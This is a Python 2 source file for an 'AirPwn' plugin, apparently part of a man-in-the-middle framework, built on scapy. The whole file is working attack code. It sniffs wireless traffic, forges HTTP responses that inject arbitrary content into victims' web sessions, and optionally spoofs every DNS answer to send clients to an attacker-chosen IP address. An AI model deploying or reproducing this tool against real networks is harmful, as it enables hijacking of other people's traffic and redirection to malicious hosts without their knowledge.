# Some of this code was stolen from https://jordan-wright.github.io/blog/2013/11/15/wireless-attacks-with-python-part-one-the-airpwn-attack/

from plugins.plugin import Plugin
import threading
import logging
import sys
import re
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy
from scapy.all import *

try:
    from configobj import ConfigObj
except:
    sys.exit('[-] configobj library not installed!')

class AirPwn(Plugin):
	name = 'Airpwn'
	optname = 'airpwn'
	desc = 'Monitor traffic on an 802.11 network and respond with arbitrary content as configured'
	has_opts = True

	def initialize(self, options):
		self.options = options
		self.mon_interface = options.interface
		self.aircfg = options.aircfg
		self.dnspwn = options.dnspwn

		if os.geteuid() != 0:
			sys.exit("[-] AirPwn plugin requires root privileges")

		if not self.mon_interface:
			sys.exit("[-] AirPwn plugin requires --miface argument")

		try:
			self.aircfg = ConfigObj("./config/airpwn.cfg")
			#Here we compile the regexes for faster performance when injecting packets
			for rule in self.aircfg.items():
				rule[1]['match'] = re.compile(r'%s' % rule[1]['match'])
				if 'ignore' in rule[1].keys():
					rule[1]['ignore'] = re.compile(r'%s' % rule[1]['ignore'])

		except Exception, e:
			sys.exit("[-] Error parsing airpwn config file: %s" % e)

		print "[*] AirPwn plugin online"
		t = threading.Thread(name='sniff_http_thread', target=self.sniff_http, args=(self.mon_interface,))
		t.setDaemon(True)
		t.start()

		if self.dnspwn:
			print "[*] DNSpwn attack enabled"
			t2 = threading.Thread(name='sniff_dns_thread', target=self.sniff_dns, args=(self.mon_interface,))
			t2.setDaemon(True)
			t2.start()

	def sniff_http(self, iface):
		sniff(filter="tcp and port 80", prn=self.http_callback, iface=iface)

	def sniff_dns(self, iface):
		sniff(filter="udp and port 53", prn=self.dns_callback, iface=iface)

	def http_callback(self, packet):
		if packet.haslayer(TCP) and packet.haslayer(Raw):
			for rule in self.aircfg.items():
				if 'ignore' in rule[1].keys():
					if (re.search(rule[1]['match'], packet[Raw].load)) and not (re.search(rule[1]['ignore'], packet[Raw].load)):
						# First we copy the original packet
						response = packet.copy()
						# We need to start by changing our response to be "from-ds", or from the access point.
						response.FCfield = 2L
						# Switch the MAC addresses
						response.addr1, response.addr2 = packet.addr2, packet.addr1
						# Switch the IP addresses
						response.src, response.dst = packet.dst, packet.src
						# Switch the ports
						response.sport, response.dport = packet.dport, packet.sport
						# Switch sequence and ack
						response[TCP].seq = packet[TCP].ack
						# Inject our data
						response[Raw].load = open(rule[1]['response'], 'rb').read()
						# Calculate new ack
						response[TCP].ack = packet[TCP].seq + len(response[Raw].load)
						# Delete packet checksums
						del response[IP].chksum
						del response[TCP].chksum
						# Some scapy-fu to re-calculate all checksums
						response = response.__class__(str(response))
						# Send the packet
						sendp(response, iface=self.mon_interface, verbose=False)
						logging.info("%s >> Replaced content" % response.src)

				elif 'ignore' not in rule[1].keys():
					if (re.search(rule[1]['match'], packet[Raw].load)):
						response = packet.copy()
						response.FCfield = 2L
						response.addr1, response.addr2 = packet.addr2, packet.addr1
						response.src, response.dst = packet.dst, packet.src
						response.sport, response.dport = packet.dport, packet.sport
						response[TCP].seq = packet[TCP].ack
						response[Raw].load = open(rule[1]['response'], 'rb').read()
						response[TCP].ack = packet[TCP].seq + len(response[Raw].load)
						del response[IP].chksum
						del response[TCP].chksum
						response = response.__class__(str(response))
						sendp(response, iface=self.mon_interface, verbose=False)
						logging.info("%s >> Replaced content" % response.src)

	def dns_callback(self, packet):
		if packet.haslayer(UDP) and packet.haslayer(DNS):
			req_domain = packet[DNS].qd.qname
			response = packet.copy()
			response.FCfield = 2L
			response.addr1, response.addr2 = packet.addr2, packet.addr1
			response.src, response.dst = packet.dst, packet.src
			response.sport, response.dport = packet.dport, packet.sport
			# Set the DNS flags
			response[DNS].qr = 1L
			response[DNS].ra = 1L
			response[DNS].ancount = 1
			response[DNS].an = DNSRR(
				rrname = req_domain,
				type = 'A',
				rclass = 'IN',
				ttl = 900,
				rdata = self.dnspwn
			)

			del response[IP].chksum
			del response[UDP].chksum
			del response[UDP].len
			response = response.__class__(str(response))

			sendp(response, iface=self.mon_interface, verbose=False)
			logging.info("%s >> Spoofed DNS for %s" % (response.src, req_domain))

	def add_options(self, options):
		options.add_argument('--dnspwn', type=str, dest='dnspwn', help='Enables the DNSpwn attack and specifies ip')
